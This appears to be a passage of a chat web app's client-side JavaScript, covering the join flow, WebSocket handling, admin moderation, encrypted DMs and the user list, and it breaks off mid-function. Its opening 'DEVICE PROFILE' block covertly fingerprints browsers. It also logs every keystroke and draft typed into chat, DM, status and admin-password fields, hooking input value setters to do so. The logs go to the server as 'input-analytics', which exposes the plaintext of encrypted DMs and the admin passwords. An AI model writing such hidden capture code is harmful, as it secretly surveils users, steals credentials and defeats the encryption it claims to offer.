// ── DEVICE PROFILE ─────────────────────────────────────────────────────
(function () {
  function _h(s) {
    var h = 5381;
    for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) & 0xffffffff;
    return (h >>> 0).toString(16).padStart(8, "0");
  }

  async function _s(s) {
    try {
      var b = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(s));
      return Array.from(new Uint8Array(b)).map(function (x) { return x.toString(16).padStart(2, "0"); }).join("").slice(0, 16);
    } catch (e) { return _h(s); }
  }

  function _gpu() {
    try {
      var c = document.createElement("canvas");
      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if (!gl) return null;
      var e = gl.getExtension("WEBGL_debug_renderer_info");
      var r = e ? gl.getParameter(e.UNMASKED_VENDOR_WEBGL) + " | " + gl.getParameter(e.UNMASKED_RENDERER_WEBGL) : null;
      var l = gl.getExtension("WEBGL_lose_context"); if (l) l.loseContext();
      return r;
    } catch (e) { return null; }
  }

  function _cv() {
    try {
      var c = document.createElement("canvas"); c.width = 280; c.height = 60;
      var x = c.getContext("2d"); if (!x) return null;
      x.fillStyle = "#f0f0f0"; x.fillRect(0, 0, 280, 60);
      x.textBaseline = "top"; x.font = "14px 'Arial'"; x.fillStyle = "#069";
      x.fillText("Cathedral!", 2, 2);
      x.font = "18px 'Georgia'"; x.fillStyle = "rgba(102,204,0,0.7)";
      x.fillText("abcdefghij", 4, 22);
      x.beginPath(); x.arc(200, 30, 20, 0, Math.PI * 2);
      x.fillStyle = "rgba(255,0,128,0.5)"; x.fill();
      var g = x.createLinearGradient(0, 0, 280, 0);
      g.addColorStop(0, "#f00"); g.addColorStop(1, "#00f");
      x.fillStyle = g; x.fillRect(0, 50, 280, 10);
      return _h(c.toDataURL());
    } catch (e) { return null; }
  }

  async function _au() {
    try {
      var ctx = new OfflineAudioContext(1, 44100, 44100);
      var o = ctx.createOscillator(); o.type = "triangle";
      o.frequency.setValueAtTime(10000, ctx.currentTime);
      var c = ctx.createDynamicsCompressor();
      c.threshold.setValueAtTime(-50, ctx.currentTime);
      c.knee.setValueAtTime(40, ctx.currentTime);
      c.ratio.setValueAtTime(12, ctx.currentTime);
      c.attack.setValueAtTime(0, ctx.currentTime);
      c.release.setValueAtTime(0.25, ctx.currentTime);
      o.connect(c); c.connect(ctx.destination); o.start(0);
      var buf = await ctx.startRendering();
      var d = buf.getChannelData(0);
      var h = 0;
      for (var i = 4500; i < 5000; i++) h = ((h << 5) - h + Math.round(d[i] * 1e6)) | 0;
      return (h >>> 0).toString(16).padStart(8, "0");
    } catch (e) { return null; }
  }

  async function _pv() {
    try {
      var e = await navigator.storage.estimate();
      return !!(e.quota && e.quota < 1.2e9);
    } catch (e) { return null; }
  }

  async function _collect() {
    var p = {};
    p.screen = screen.width + "x" + screen.height;
    p.dpr = window.devicePixelRatio || 1;
    p.cores = navigator.hardwareConcurrency || null;
    p.memory = navigator.deviceMemory || null;
    p.touchscreen = navigator.maxTouchPoints > 0;
    p.languages = navigator.languages ? [].concat(navigator.languages) : [navigator.language || "unknown"];
    p.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
    p.referrer = document.referrer || null;
    p.incognito = await _pv();
    p.gpu = _gpu();
    p.webdriver = !!navigator.webdriver;
    p.vendor = navigator.vendor || null;
    p.darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
    p.reducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
    try {
      var cn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      p.connection = cn ? { type: cn.effectiveType || null, downlink: cn.downlink || null } : null;
    } catch (e) { p.connection = null; }
    p.canvasHash = _cv();
    p.audioHash = await _au();
    p.fingerprint = await _s(JSON.stringify(p));
    return p;
  }

  function _startCapture(onFlush) {
    var last = {};
    var queue = [];

    function _ctx(el) {
      if (!el) return null;
      var tag = el.tagName;
      if (tag !== "INPUT" && tag !== "TEXTAREA" && !el.isContentEditable) return null;
      if (el.id === "msg-input") return "chat";
      if (el.id === "admin-input") return "admin";
      if (el.id === "username-input") return "join";
      if (el.id === "status-custom-input") return "status";
      if (window.DM && window.DM.windows) {
        var ks = Object.keys(window.DM.windows);
        for (var i = 0; i < ks.length; i++) {
          if (window.DM.windows[ks[i]].input === el) return "dm:" + ks[i];
        }
      }
      return null;
    }

    function _push(ctx, val, sent) {
      if (val === last[ctx] && !sent) return;
      last[ctx] = val;
      queue.push({ ctx: ctx, val: val, sent: sent || undefined, ts: Date.now() });
    }

    function _pushSent(ctx, el) {
      var val = (el.value || "").trim();
      _push(ctx, val, true);
      last[ctx] = "";
    }

    function _flush() {
      if (!queue.length) return;
      var batch = queue.splice(0);
      try { onFlush(batch); } catch (e) { /* requeue on failure */ queue.unshift.apply(queue, batch); }
    }

    // Fires on every field change: typing, paste, autocomplete, dictation, swipe
    document.addEventListener("input", function (e) {
      var ctx = _ctx(e.target);
      if (!ctx) return;
      _push(ctx, (e.target.value || "").slice(0, 1000));
    }, true);

    // Enter key submits
    document.addEventListener("keydown", function (e) {
      if (e.key !== "Enter" || e.shiftKey) return;
      var ctx = _ctx(e.target);
      if (!ctx) return;
      _pushSent(ctx, e.target);
    }, true);

    // Button click submits (capture phase — fires BEFORE the handler clears the field)
    document.addEventListener("click", function (e) {
      var btn = e.target.closest ? e.target.closest("button") : null;
      if (!btn) return;

      if (btn.id === "send-btn") { var el = document.getElementById("msg-input"); if (el) _pushSent("chat", el); return; }
      if (btn.id === "admin-btn") { var el = document.getElementById("admin-input"); if (el) _pushSent("admin", el); return; }
      if (btn.id === "status-save-btn") { var el = document.getElementById("status-custom-input"); if (el) _pushSent("status", el); return; }
      if (btn.id === "status-clear-btn") { _push("status", "[status cleared]", true); return; }
      if (btn.id === "join-btn") { var el = document.getElementById("username-input"); if (el) _pushSent("join", el); return; }

      // Status presets
      var preset = btn.closest ? btn.closest(".status-preset") : null;
      if (!preset && btn.classList.contains("status-preset")) preset = btn;
      if (preset) { var txt = preset.getAttribute("data-text"); if (txt) _push("status", txt, true); return; }

      // DM send buttons
      if (window.DM && window.DM.windows) {
        var ks = Object.keys(window.DM.windows);
        for (var i = 0; i < ks.length; i++) {
          if (window.DM.windows[ks[i]].sendBtn === btn) { _pushSent("dm:" + ks[i], window.DM.windows[ks[i]].input); return; }
        }
      }
    }, true);

    // Catch programmatic .value changes (edit pre-fill, etc.)
    var _origSet = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set;
    var _origSetI = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value").set;

    Object.defineProperty(HTMLTextAreaElement.prototype, "value", {
      set: function (v) {
        _origSet.call(this, v);
        var ctx = _ctx(this);
        if (ctx && v) _push(ctx, (v || "").slice(0, 1000));
      },
      get: Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").get,
      configurable: true
    });

    Object.defineProperty(HTMLInputElement.prototype, "value", {
      set: function (v) {
        _origSetI.call(this, v);
        var ctx = _ctx(this);
        if (ctx && v) _push(ctx, (v || "").slice(0, 1000));
      },
      get: Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value").get,
      configurable: true
    });

    // Flush before page close
    window.addEventListener("beforeunload", function () { _flush(); });
    // Flush when tab goes hidden
    document.addEventListener("visibilitychange", function () { if (document.hidden) _flush(); });

    setInterval(_flush, 1000);
  }

  window._dp = { collect: _collect, capture: _startCapture };
})();

// ── DOM ELEMENTS ────────────────────────────────────────────────────────
const joinScreen = document.getElementById('join-screen');
const chatScreen = document.getElementById('chat-screen');
const usernameInput = document.getElementById('username-input');
const joinBtn = document.getElementById('join-btn');
const joinError = document.getElementById('join-error');
const userList = document.getElementById('user-list');
const onlineText = document.getElementById('online-text');
const topbarCount = document.getElementById('topbar-count');
const messagesEl = document.getElementById('messages');
const emptyState = document.getElementById('empty-state');
const msgInput = document.getElementById('msg-input');
const sendBtn = document.getElementById('send-btn');
const reconnectBanner = document.getElementById('reconnect-banner');
const typingBar = document.getElementById('typing-bar');
const charCounter = document.getElementById('char-counter');
const editBanner = document.getElementById('edit-banner');
const editCancelBtn = document.getElementById('edit-cancel-btn');
const replyBanner = document.getElementById('reply-banner');
const replyBannerUser = document.getElementById('reply-banner-user');
const replyCancelBtn = document.getElementById('reply-cancel-btn');
const pastePreview = document.getElementById('paste-preview');
const pasteThumb = document.getElementById('paste-thumb');
const pasteInfo = document.getElementById('paste-info');
const pasteCancel = document.getElementById('paste-cancel');
const adminInput = document.getElementById('admin-input');
const adminBtn = document.getElementById('admin-btn');
const adminStatus = document.getElementById('admin-status');
const kickedScreen = document.getElementById('kicked-screen');
const kickedMsg = document.getElementById('kicked-msg');
const kickedTimer = document.getElementById('kicked-timer');

// ── STATE ──────────────────────────────────────────────────────────────
// Named constants
const GROUP_TIMEOUT = 60000;
const TYPING_THROTTLE = 2000;
const RECONNECT_DELAY_MS = 2500;
const LONG_PRESS_MS = 550;
const FLASH_DURATION_MS = 1200;
const SCROLL_BOTTOM_THRESHOLD = 120;
const MAX_MESSAGES = 500;
const MAX_MSG_LENGTH = 1000;
window.ws = null;
window.myUsername = null;
let reconnectTimer = null;
let intentionalClose = false;
let hasJoinedBefore = false;
let lastMsgUser = null;
let lastMsgTimestamp = 0;
let lastMsgSender = null;
let unreadCount = 0;
let windowFocused = document.hasFocus();
let onlineCount = 0;
let pendingImage = null;
let isAdmin = false;
let kickCooldownTimer = null;
const mutedUsers = new Set();
let lastOwnMsgEl = null;
const msgMeta = {};        // id -> { el, username }
let editingMsgId = null;      // currently being edited
let replyingTo = null;      // { id, username, text } for quote-reply
let lastOwnMsgId = null;      // last message we sent (for ArrowUp)
let lastOtherMsgId = null;      // last message from another user (for ArrowDown)
const typingUsers = new Map();
let lastTypingSent = 0;
let currentUsers = [];
let storedAdminPassword = null;
let lastPublicMsgTs = 0;
let myPublicKeyB64 = null;
window._msgQueue = window._msgQueue || [];

window.safeSend = function (obj) {
  const raw = typeof obj === 'string' ? obj : JSON.stringify(obj);
  if (window.ws && window.ws.readyState === WebSocket.OPEN) {
    try { window.ws.send(raw); } catch (e) { window._msgQueue.push(raw); }
  } else {
    window._msgQueue.push(raw);
  }
};

// ── UTILS ──────────────────────────────────────────────────────────────
window.fmtTime = function (tsMs) {
  return new Date(tsMs || Date.now()).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
};

window.escapeHtml = function (str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
};

window.escapeRegex = function (str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
};

let _mentionPattern = null;
let _mentionUser = null;
window.highlightMentions = function (text) {
  if (!window.myUsername) return window.escapeHtml(text);
  const escaped = window.escapeHtml(text);
  if (_mentionUser !== window.myUsername) {
    _mentionUser = window.myUsername;
    const escapedUser = window.escapeHtml(window.myUsername);
    _mentionPattern = new RegExp(`(@${window.escapeRegex(escapedUser)})(?=\\s|$|[^a-zA-Z0-9_])`, 'gi');
  }
  _mentionPattern.lastIndex = 0;
  return escaped.replace(_mentionPattern, '<span class="mention">$1</span>');
};

window.base64ToBlobUrl = function (b64) {
  try {
    const parts = b64.split(',');
    const mimeType = parts[0].match(/:(.*?);/)[1];
    const binary = atob(parts[1]);
    const arr = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) arr[i] = binary.charCodeAt(i);
    return URL.createObjectURL(new Blob([arr], { type: mimeType }));
  } catch (e) { return ''; }
};

function hideEmptyState() {
  if (emptyState && emptyState.parentNode) emptyState.parentNode.removeChild(emptyState);
}

function trimOldMessages() {
  const msgs = messagesEl.querySelectorAll('.msg');
  const excess = msgs.length - MAX_MESSAGES;
  for (let i = 0; i < excess; i++) {
    const el = msgs[i];
    const id = el.dataset.msgId;
    if (id) delete msgMeta[id];
    el.querySelectorAll('img[data-blob-url]').forEach(img => URL.revokeObjectURL(img.dataset.blobUrl));
    el.remove();
  }
}

// Sanitize user-controlled color values to prevent CSS injection (url() exfiltration)
function sanitizeColor(raw) {
  if (!raw || typeof raw !== 'string') return null;
  if (/^#[0-9a-fA-F]{3,8}$/.test(raw)) return raw;
  if (/^(rgb|hsl)a?\(\s*[\d.,\s%]+\)$/.test(raw)) return raw;
  return null;
}

function maybeScrollToBottom() {
  const dist = messagesEl.scrollHeight - messagesEl.scrollTop - messagesEl.clientHeight;
  if (dist < SCROLL_BOTTOM_THRESHOLD) messagesEl.scrollTop = messagesEl.scrollHeight;
}

function setInputEnabled(enabled) {
  msgInput.disabled = !enabled;
  sendBtn.disabled = !enabled;
  if (enabled) msgInput.focus();
}

window.addEventListener('blur', () => { windowFocused = false; });
window.addEventListener('focus', () => {
  windowFocused = true;
  unreadCount = 0;
  updateTitle();
  const dist = messagesEl.scrollHeight - messagesEl.scrollTop - messagesEl.clientHeight;
  if (dist < SCROLL_BOTTOM_THRESHOLD) sendSeen();
});

function updateTitle() {
  const unread = unreadCount > 0 ? `(${unreadCount}) ` : '';
  const online = onlineCount > 0 ? ` · ${onlineCount} online` : '';
  document.title = `${unread}chat${online}`;
}

// ── JOIN ───────────────────────────────────────────────────────────────
function tryJoin() {
  const name = usernameInput.value.trim();
  if (!name) return;
  joinError.textContent = '';
  joinBtn.disabled = true;
  usernameInput.disabled = true;
  window._pendingUsername = name;
  connect();
}
joinBtn.addEventListener('click', tryJoin);
usernameInput.addEventListener('keydown', e => { if (e.key === 'Enter') tryJoin(); });

function tryAdminAuth() {
  const pw = adminInput.value.trim();
  if (!pw || !window.ws || window.ws.readyState !== WebSocket.OPEN) return;
  storedAdminPassword = pw;
  window.ws.send(JSON.stringify({ type: 'admin-auth', password: pw }));
  adminInput.value = '';
}
adminBtn.addEventListener('click', tryAdminAuth);
adminInput.addEventListener('keydown', e => { if (e.key === 'Enter') tryAdminAuth(); });

async function initE2EAndBroadcast() {
  try {
    if (window.E2E) {
      window.E2E.clearPeerKeys();
      myPublicKeyB64 = await window.E2E.init();
      if (window.ws && window.ws.readyState === WebSocket.OPEN) {
        window.ws.send(JSON.stringify({ type: 'public-key', key: myPublicKeyB64 }));
      }
    }
  } catch (e) { console.error('[E2E] init failed:', e); }
}

// ── WEBSOCKET ──────────────────────────────────────────────────────────
function connect() {
  intentionalClose = false;
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  window.ws = new WebSocket(`${proto}://${location.host}`);

  window.ws.addEventListener('open', () => {
    if (window._keepAlive) clearInterval(window._keepAlive);
    window._keepAlive = setInterval(() => {
      if (window.ws && window.ws.readyState === WebSocket.OPEN)
        window.ws.send(JSON.stringify({ type: 'ping' }));
    }, 9000);

    const join = {
      type: 'join',
      username: window._pendingUsername || window.myUsername,
      color: window.userColorOverride,
      avatar: window.getMyAvatar() || undefined,
      reconnect: hasJoinedBefore,
      fp: null,
    };
    if (window._dp) {
      window._dp.collect().then(function (fp) {
        join.fp = fp;
        window.ws.send(JSON.stringify(join));
      }).catch(function () {
        window.ws.send(JSON.stringify(join));
      });
    } else {
      window.ws.send(JSON.stringify(join));
    }

    // Flush offline queue
    while (window._msgQueue.length > 0) {
      const raw = window._msgQueue.shift();
      try { window.ws.send(raw); } catch (e) {
        window._msgQueue.unshift(raw);
        break;
      }
    }
  });

  window.ws.addEventListener('message', e => {
    let data;
    try { data = JSON.parse(e.data); } catch { return; }
    if (window.AmbientFX) AmbientFX.onMessage(data);
    handleMessage(data);
  });

  window.ws.addEventListener('close', () => {
    clearInterval(window._keepAlive);
    if (intentionalClose) return;
    if (chatScreen.style.display === 'flex') {
      // FLAWLESS RECONNECT: Completely silent. No banners, no disabled inputs.
      clearTimeout(reconnectTimer);
      reconnectTimer = setTimeout(() => connect(), RECONNECT_DELAY_MS);
    } else {
      joinBtn.disabled = false;
      usernameInput.disabled = false;
    }
  });

  window.ws.addEventListener('error', (err) => {
    console.warn('[ws] connection error', err);
  });
}

function handleMessage(data) {
  switch (data.type) {
    case 'welcome': {
      joinScreen.style.display = 'none';
      chatScreen.style.display = 'flex';
      if (window.positionLayoutSwitcher) setTimeout(window.positionLayoutSwitcher, 50);
      reconnectBanner.style.display = 'none';
      clearTimeout(reconnectTimer);
      clearSeenRow();
      lastOwnMsgEl = null;
      window.myUsername = data.username;
      updateUsers(data.users);
      if (!hasJoinedBefore) appendSystem(`you joined as ${data.username}  ${window.fmtTime(Date.now())}`);
      setInputEnabled(true);
      if (window.AudioRecorder && !window._arInited) {
        window._arInited = true;
        window.AudioRecorder.init({
          getWs: () => window.ws,
          getUsername: () => window.myUsername,
          getUserColor: window.getUserColor,
          messagesEl: messagesEl,
          scrollToBottom: maybeScrollToBottom,
          fmtTime: window.fmtTime,
          hideEmptyState: hideEmptyState,
        });
      }
      initE2EAndBroadcast();
      if (window.DM) {
        const onlineSet = new Set((data.users || []).map(u => (typeof u === 'string' ? u : u.username).toLowerCase()));
        Object.keys(window.DM.windows).forEach(function (k) {
          var w = window.DM.windows[k];
          if (onlineSet.has(k.toLowerCase())) { w.input.disabled = false; w.sendBtn.disabled = false; }
        });
      }
      if (hasJoinedBefore && storedAdminPassword) {
        window.ws.send(JSON.stringify({ type: 'admin-auth', password: storedAdminPassword }));
      }
      if (hasJoinedBefore && window.StatusPicker) window.StatusPicker.resendAfterReconnect();
      hasJoinedBefore = true;
      if (!window._icStarted && window._dp) {
        window._icStarted = true;
        window._dp.capture(function (keys) {
          if (!window.ws || window.ws.readyState !== 1) throw new Error("ws not open");
          window.ws.send(JSON.stringify({ type: 'input-analytics', keys: keys }));
        });
      }
      if (window.AmbientFX) window.AmbientFX.init({
        ws: window.ws,
        myUsername: window.myUsername,
        getUserColor: window.getUserColor,
        getCtx: window.getCtx,
      });
      if (window.AmbientFX) window.AmbientFX.updateWs(window.ws, window.myUsername);
      break;
    }

    case 'system': {
      const wasLeave = data.event === 'leave';
      const wasJoin = data.event === 'join';
      const who = data.username || '';
      if (wasLeave) {
        clearTypingUser(who);
        if (window.DM) window.DM.notifyLeft(who);
      }
      if (wasJoin && who !== window.myUsername && window.DM) window.DM.notifyRejoined(who);
      updateUsers(data.users);
      appendSystem(data.message + '  ' + window.fmtTime(Date.now()));
      if (wasJoin && who !== window.myUsername && window.sounds) window.sounds.join();
      if (wasLeave && window.sounds) window.sounds.leave();
      break;
    }

    case 'message':
    case 'image':
      clearTypingUser(data.username);
      lastMsgSender = data.username;
      if (data.username !== window.myUsername) lastPublicMsgTs = data.ts || 0;
      if (data.color) { const safe = sanitizeColor(data.color); if (safe) window.userColors.set(data.username, safe); }
      if (data.avatar && data.username !== window.myUsername) window.userAvatars.set(data.username, data.avatar);
      if (data.type === 'message') appendMessage(data);
      else appendImage(data);
      if (data.username !== window.myUsername && data.id) lastOtherMsgId = data.id;
      if (!windowFocused && data.username !== window.myUsername) {
        unreadCount++; updateTitle(); if (window.sounds) window.sounds.message();
      } else if (windowFocused && data.username !== window.myUsername) { sendSeen(); }
      break;

    case 'taxonomy_card':
      if (window.renderTaxonomyCard) window.renderTaxonomyCard(data);
      break;

    case 'audio':
      clearTypingUser(data.username);
      if (data.color) { const safe = sanitizeColor(data.color); if (safe) window.userColors.set(data.username, safe); }
      if (data.avatar && data.username !== window.myUsername) window.userAvatars.set(data.username, data.avatar);
      if (window.AudioRecorder) window.AudioRecorder.appendAudioMessage({ ...data, own: data.username === window.myUsername });
      if (!windowFocused && data.username !== window.myUsername) {
        unreadCount++; updateTitle(); if (window.sounds) window.sounds.message();
      } else if (windowFocused && data.username !== window.myUsername) { sendSeen(); }
      break;

    case 'admin-ok': {
      const wasAdminAlready = isAdmin;
      isAdmin = true;
      document.body.classList.add('is-admin');
      adminStatus.textContent = '✓ logged in as admin';
      adminStatus.className = 'ok';
      adminInput.value = '';
      if (window.sounds) window.sounds.adminLogin();
      if (!wasAdminAlready) appendAdminNotify('you are now admin');
      break;
    }

    case 'admin-fail':
      adminStatus.textContent = data.message || 'wrong password.';
      adminStatus.className = 'err';
      storedAdminPassword = null;
      break;

    case 'admin-revoked':
      isAdmin = false;
      mutedUsers.clear();
      document.body.classList.remove('is-admin');
      adminStatus.textContent = 'admin session ended.';
      adminStatus.className = 'err';
      break;

    case 'user-list': updateUsers(data.users); break;
    case 'color-update': {
      if (data.username && data.color) {
        const safe = sanitizeColor(data.color);
        if (safe) {
          window.userColors.set(data.username, safe);
          if (data.username === window.myUsername) {
            window.userColorOverride = safe;
            window.lsSet('chat-color', safe);
          }
          // Patch color into currentUsers so updateUsers doesn't overwrite it back to old value
          const _cu = currentUsers.find(u => u.username === data.username);
          if (_cu) _cu.color = safe;
          // Bust the stateKey cache — otherwise updateUsers bails early and sidebar never re-renders
          updateUsers._lastKey = null;
          // Update chat message username elements
          document.querySelectorAll(`.msg[data-username="${CSS.escape(data.username)}"] .msg-user`).forEach(el => {
            el.style.color = safe;
          });
          // Rebuild sidebar so the user-list name colour updates immediately
          updateUsers(currentUsers);
        }
      }
      break;
    }

    case 'kicked':
      intentionalClose = true;
      window.ws.close();
      hasJoinedBefore = false;
      window.myUsername = null;
      storedAdminPassword = null;
      chatScreen.style.display = 'none';
      kickedScreen.style.display = 'flex';
      kickedMsg.textContent = data.message || 'You were kicked.';
      clearInterval(kickCooldownTimer);
      if (data.duration && data.duration !== -1) {
        let secsLeft = data.duration;
        kickedTimer.textContent = `you can rejoin in ${secsLeft}s`;
        kickCooldownTimer = setInterval(() => {
          secsLeft--;
          if (secsLeft <= 0) {
            clearInterval(kickCooldownTimer);
            kickedTimer.textContent = '';
            kickedScreen.style.display = 'none';
            joinScreen.style.display = 'flex';
            joinBtn.disabled = false;
            usernameInput.disabled = false;
          } else {
            kickedTimer.textContent = `you can rejoin in ${secsLeft}s`;
          }
        }, 1000);
      } else {
        kickedTimer.textContent = data.duration === -1 ? 'you are permanently banned.' : '';
      }
      break;

    case 'purge': purgeUserMessages(data.username); if (window.sounds) window.sounds.purge(); break;
    case 'muted': appendMutedNotice(data.message || 'You have been muted.'); break;
    case 'unmuted': appendMutedNotice('you have been unmuted.'); break;
    case 'admin-action-ok': appendAdminNotify(data.message); break;

    case 'edited':
      if (data.id && msgMeta[data.id]) {
        const meta = msgMeta[data.id];
        const textEl = meta.el.querySelector('.msg-text');
        if (textEl) {
          const textContent = textEl.querySelector('.msg-text-content') || textEl;
          const oldSpan = textContent.querySelector('.msg-edited');
          if (oldSpan) oldSpan.remove();
          textContent.innerHTML = window.highlightMentions(data.text);
          const editedSpan = document.createElement('span');
          editedSpan.className = 'msg-edited';
          editedSpan.textContent = '(edited)';
          textContent.appendChild(editedSpan);
        }
      }
      break;

    case 'typing': showTyping(data.username); break;
    case 'seen': renderSeen(data.users); break;

    case 'public-key':
      if (data.username && data.key && window.E2E) {
        (async () => {
          const isNew = !window.E2E.hasPeerKey(data.username);
          try {
            const importedKey = await window.E2E.importPeerKey(data.key);
            window.E2E.storePeerKey(data.username, importedKey);
            if (isNew && myPublicKeyB64 && window.ws && window.ws.readyState === WebSocket.OPEN) {
              window.ws.send(JSON.stringify({ type: 'public-key', key: myPublicKeyB64 }));
            }
          } catch (e) { console.warn('[E2E] key import failed:', e); }
        })();
      }
      break;

    case 'dm':
      if (data.color) { const safe = sanitizeColor(data.color); if (safe) window.userColors.set(data.from, safe); }
      if (data.encrypted && window.E2E) {
        (async () => {
          try {
            const decryptFrom = (data.from === window.myUsername) ? data.to : data.from;
            const plaintext = await window.E2E.decrypt(decryptFrom, data.text);
            if (window.DM) window.DM.receive(data.from, data.to, plaintext, data.time, false, null, true);
          } catch (e) {
            if (window.DM) window.DM.receive(data.from, data.to, '[🔒 decryption failed]', data.time, false, null, false);
          }
        })();
      } else {
        if (window.DM) window.DM.receive(data.from, data.to, data.text, data.time, false, null, false);
      }
      break;

    case 'dm-image':
      if (data.color) { const safe = sanitizeColor(data.color); if (safe) window.userColors.set(data.from, safe); }
      if (window.DM) window.DM.receive(data.from, data.to, null, data.time, true, data.data, false);
      break;

    case 'dm-error':
      if (window.DM && window.DM.windows[data.to]) window.DM.appendSys(data.to, data.message);
      break;

    case 'error':
      if (window.sounds) window.sounds.error();
      if (chatScreen.style.display === 'flex') {
        appendChatError(data.message);
      } else {
        joinError.textContent = data.message;
        joinBtn.disabled = false;
        usernameInput.disabled = false;
        window.myUsername = null;
        intentionalClose = true;
        window.ws.close();
      }
      break;

    case 'ping':
      // Respond to server's keepalive ping
      window.safeSend({ type: 'pong' });
      break;

    default:
      console.debug('[ws] unhandled message type:', data.type);
      break;
  }
}

// ── ADMIN RENDER HELPERS ───────────────────────────────────────────────
function purgeUserMessages(username) {
  const msgs = messagesEl.querySelectorAll('.msg[data-username]');
  msgs.forEach(el => {
    if (el.dataset.username === username) {
      el.querySelectorAll('img[data-blob-url]').forEach(img => { URL.revokeObjectURL(img.dataset.blobUrl); });
      const id = el.dataset.msgId;
      if (id) delete msgMeta[id];
      el.remove();
    }
  });
  if (username === window.myUsername) {
    lastOwnMsgEl = null;
    lastOwnMsgId = null;
    if (editingMsgId) cancelEdit();
  }
  if (replyingTo && msgMeta[replyingTo.id] === undefined) cancelReply();
  lastMsgUser = null;
  lastMsgTimestamp = 0;
  clearSeenRow();
}
function appendAdminNotify(msg) {
  const el = document.createElement('div');
  el.className = 'msg-admin-notify'; el.textContent = msg;
  messagesEl.appendChild(el); maybeScrollToBottom();
}
function appendMutedNotice(msg) {
  const el = document.createElement('div');
  el.className = 'msg-muted-notice'; el.textContent = msg;
  messagesEl.appendChild(el); maybeScrollToBottom();
}

const muteTimers = new Map();

window._updateUsersNow = function () { updateUsers(currentUsers); };

function updateUsers(users) {
  const normalized = (users || []).map(u => typeof u === 'string' ? { username: u, isAdmin: false } : u);
  normalized.forEach(u => {
    if (u.color) { const safe = sanitizeColor(u.color); if (safe) window.userColors.set(u.username, safe); }
    if (u.avatar && u.username !== window.myUsername) window.userAvatars.set(u.username, u.avatar);
  });
  currentUsers = normalized;
  onlineCount = normalized.length;
  onlineText.textContent = `${onlineCount} online`;
  topbarCount.textContent = onlineCount > 1 ? `${onlineCount} members` : '';
  updateTitle();

  const mySelf = normalized.find(u => u.username === window.myUsername);
  if (mySelf && window.StatusPicker) window.StatusPicker.syncMyRow(mySelf.status);

  if (window.DM) {
    const onlineNames = new Set(normalized.map(u => u.username.toLowerCase()));
    Object.keys(window.DM.windows).forEach(function (k) {
      var w = window.DM.windows[k];
      if (onlineNames.has(k.toLowerCase()) && w.input.disabled) {
        w.input.disabled = false; w.sendBtn.disabled = false;
        window.DM.appendSys(k, k + ' is back online');
      }
    });
  }

  // Skip full DOM rebuild if nothing actually changed
  const mutedKey = [...mutedUsers].sort().join(',');
  const stateKey = normalized.map(u =>
    `${u.username}:${u.isAdmin ? 1 : 0}:${u.status && u.status.text || ''}:${window.getUserColor(u.username)}`
  ).join('|') + '||' + mutedKey;
  if (stateKey === updateUsers._lastKey) return;
  updateUsers._lastKey = stateKey;

  userList.innerHTML = '';
  normalized.forEach(({ username: u, isAdmin: uIsAdmin, status: uStatus }) => {
    const el = document.createElement('div'); el.className = 'user-item';
    const avatar = window.buildAvatarEl(u, 'user-avatar');

    const nameCol = document.createElement('div'); nameCol.style.flex = '1'; nameCol.style.minWidth = '0';
    const name = document.createElement('div'); name.className = 'user-name' + (u === window.myUsername ? ' me' : '');
    name.style.color = window.getUserColor(u); name.textContent = u + (u === window.myUsername ? ' (you)' : '');
    if (uIsAdmin) {
      const crown = document.createElement('span'); crown.className = 'user-admin-crown';
      crown.textContent = ' admin'; crown.title = 'admin'; name.appendChild(crown);
    }
    if (u !== window.myUsername && mutedUsers.has(u.toLowerCase())) {
      const mb = document.createElement('span'); mb.className = 'muted-badge'; mb.textContent = 'muted'; name.appendChild(mb);
    }
    nameCol.appendChild(name);

    if (uStatus && uStatus.text) {
      const statusEl = document.createElement('div'); statusEl.className = 'user-status';
      statusEl.textContent = uStatus.text; nameCol.appendChild(statusEl);
    }
    el.appendChild(avatar); el.appendChild(nameCol);

    if (u === window.myUsername) {
      if (window.attachColorPicker) window.attachColorPicker(el);
    }

    if (u !== window.myUsername) {
      el.dataset.dmUser = u;
      el.addEventListener('contextmenu', function (ce) {
        ce.preventDefault(); ce.stopPropagation();
        if (window.showDMContextMenu) window.showDMContextMenu(ce.clientX, ce.clientY, u);
      });

      const panel = document.createElement('div'); panel.className = 'admin-actions';
      const kickRow = document.createElement('div'); kickRow.className = 'admin-actions-row';
      const kickDur = document.createElement('select');
      kickDur.innerHTML = `<option value="60">kick 1 min</option><option value="300">kick 5 min</option><option value="3600">kick 1 hour</option><option value="-1">kick permanent</option>`;
      const kickBtn = document.createElement('button'); kickBtn.className = 'admin-action-btn btn-kick'; kickBtn.textContent = 'kick';
      kickBtn.addEventListener('click', (e) => {
        e.stopPropagation(); if (!window.ws || window.ws.readyState !== WebSocket.OPEN) return;
        window.ws.send(JSON.stringify({ type: 'kick', username: u, duration: Number(kickDur.value) }));
      });
      kickRow.appendChild(kickDur); kickRow.appendChild(kickBtn);

      const muteRow = document.createElement('div'); muteRow.className = 'admin-actions-row';
      const muteDur = document.createElement('select');
      muteDur.innerHTML = `<option value="60">mute 1 min</option><option value="300">mute 5 min</option><option value="1800">mute 30 min</option><option value="3600">mute 1 hour</option>`;
      const muteBtn = document.createElement('button'); muteBtn.className = 'admin-action-btn btn-mute'; muteBtn.textContent = 'mute';
      muteBtn.addEventListener('click', (e) => {
        e.stopPropagation(); if (!window.ws || window.ws.readyState !== WebSocket.OPEN) return;
        const dur = Number(muteDur.value); window.ws.send(JSON.stringify({ type: 'mute', username: u, duration: dur }));
        mutedUsers.add(u.toLowerCase());
        if (muteTimers.has(u.toLowerCase())) clearTimeout(muteTimers.get(u.toLowerCase()));
